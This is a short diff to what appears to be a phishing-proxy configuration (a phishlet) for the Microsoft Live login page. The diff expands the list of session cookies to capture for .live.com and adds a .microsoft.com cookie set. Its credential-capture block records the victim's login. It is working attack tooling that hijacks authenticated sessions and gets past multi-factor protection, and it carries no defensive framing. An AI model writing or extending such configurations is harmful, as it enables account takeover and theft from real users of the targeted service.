@@ -10,7 +10,9 @@ sub_filters:
 #  - {triggers_on: 'login', orig_sub: 'login', domain: 'live.com', search: 'ru=https://{hostname}/login.srf', replace: 'ru=https://{orig_hostname}/login.srf', mimes: ['text/html', 'application/json', 'application/javascript']}
 auth_tokens:
   - domain: '.live.com'
-    keys: ['WLSSC','RPSSecAuth']
+    keys: ['sid', 'WLSSC','RPSSecAuth', 'MSPOK', 'MSCC', 'OParams', 'MSPRequ', '__Host-MSAAUTH']
+  - domain: '.microsoft.com'
+    keys: ['__UCIS_I', 'MS0', 'MC1']
 credentials:
   username:
     key: 'login'
